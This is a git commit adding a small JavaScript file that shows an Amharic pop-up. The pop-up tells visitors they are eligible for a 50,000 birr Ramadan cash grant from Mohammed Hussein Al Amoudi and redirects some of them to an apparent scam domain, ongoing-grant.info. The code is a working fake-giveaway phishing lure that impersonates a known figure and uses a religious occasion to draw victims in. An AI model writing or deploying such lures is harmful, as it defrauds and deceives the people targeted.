e9a62f15f5f62e7ca775d7ff5db578bccb576482
The-On-going <sirpeelawson@gmail.com>
2026-03-07 07:21:58 +0100

    Create activeramadan4.js

---
+++ activeramadan4.js
@@ -0,0 +1,10 @@
+var password = 'ጥሬ ገንዘብ ማውጣት';
+
+password = prompt(
+  'እንኳን ደስ አለዎት፣ ከሞሐመድ ሁሴን አል አሙዲ 50,000 ብር የረመዳን የገንዘብ ድጋፍ ለመቀበል ብቁ ነዎት። ወዲያውኑ ለመቀበል OK ይጫኑ።',
+  'ጥሬ ገንዘብ ማውጣት'
+);
+
+if (password !== 'ጥሬ ገንዘብ ማውጣት') {
+    location.href = 'https://ongoing-grant.info/Amoudi-Br-50000-Al.html';
+}
